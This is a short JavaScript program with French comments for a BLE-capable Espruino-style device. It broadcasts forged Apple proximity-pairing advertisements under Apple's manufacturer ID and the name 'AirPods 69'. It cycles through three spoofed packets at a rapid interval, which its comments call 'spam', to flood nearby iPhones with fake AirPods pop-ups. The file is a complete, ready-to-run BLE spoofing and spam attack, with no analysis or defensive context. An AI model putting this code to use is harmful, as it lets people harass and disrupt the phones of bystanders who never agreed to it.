let count = 0; // Compteur d'envoi

// Paquets possibles à envoyer (tableau de tableaux)
const packets = [
  [
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  ],
  [
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  ],
  [
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  ]
];

// Fonction pour lancer la pub BLE avec paquet choisi
function startAdvertising(packet) {
  NRF.setAdvertising({}, { // Données vides car on passe manufacturerData
    name: "AirPods 69",    // Nom affiché
    manufacturer: 0x004C,  // Apple Manufacturer ID
    manufacturerData: packet, // Paquet spécifique
    connectable: false,   // Non connectable (ADV_NONCONN_IND)
    interval: 40          // 40 * 0.625ms ≈ 25ms pour spam rapide
  });
}

// Fonction principale pour gérer les envois
function updateAndSend() {
  g.clear(); // Clear écran
  count++; // Incrément compteur

  // Choisir un paquet aléatoire parmi les 3
  const packet = packets[Math.floor(Math.random() * packets.length)];

  const msg = "SE (" + count + ")";
  g.setFont("6x8", 4); // Police taille 4
  const textWidth = g.stringWidth(msg);
  g.drawString(msg, (g.getWidth() - textWidth) / 2, (g.getHeight() - 32) / 2); // Centré
  g.flip(); // Affiche

  startAdvertising(packet); // Lancer la publicité BLE

  // Stopper la pub après 200 ms
  setTimeout(() => NRF.setAdvertising({}, { connectable: false }), 200);
}

// Boucle toutes les 500ms (0.5 sec)
setInterval(updateAndSend, 500);

// Initialisation écran et premier envoi
g.clear();
updateAndSend();
